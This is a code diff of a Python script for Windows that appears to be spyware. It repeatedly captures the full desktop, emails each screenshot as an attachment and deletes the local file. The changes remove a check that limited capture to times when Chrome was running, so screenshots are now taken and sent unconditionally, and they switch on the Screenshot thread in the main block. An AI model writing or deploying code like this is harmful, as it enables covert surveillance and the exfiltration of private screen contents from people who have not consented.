@@ -42,7 +42,8 @@ def get_dimensions():
 def screenshot( name = 'screenshot'):
     # making handle for desktop
     hdesktop = win32gui.GetDesktopWindow() 
-    width, height, left, top = get_dimensions()
+    width, height, left, top = get_dimensions() # hard code it?
+
 
     desktop_dc = win32gui.GetWindowDC(hdesktop)
     img_dc = win32ui.CreateDCFromHandle(desktop_dc)
@@ -79,7 +80,7 @@ def screenshot_email(subject):
         file_data = f.read()
         file_type = imghdr.what(f.name)
         file_name = f.name
-    if os.path.isfile('screenshot.bmp'):
+    if os.path.isfile('screenshot.bmp'): # there can be problem
         os.remove('screenshot.bmp')
 
     msg.add_attachment(file_data, maintype='image', subtype = file_type, filename=file_name)
@@ -128,9 +129,8 @@ class Screenshot(Thread):
         while True:
             now = datetime.now() # current date and time
             date_time = now.strftime("%m/%d/%Y, %H:%M:%S")
-            if(process_exists('chrome.exe') ): # or process_exists('firefox.exe') or process_exists('msedge.exe') or process_exists("iexplore.exe")):
-                screenshot_email(date_time)
-                print(f"message send: {now}")
+            # if(process_exists('chrome.exe') ): # or process_exists('firefox.exe') or process_exists('msedge.exe') or process_exists("iexplore.exe")):
+            screenshot_email(date_time)
             sleep(time_interval_screen)
 
 class Plainmain(Thread):
@@ -162,7 +162,7 @@ class Noise(Thread):
 
 
 if __name__ == '__main__':
-    # Screenshot()
+    Screenshot()
     Noise()
     Plainmain()
     while True:
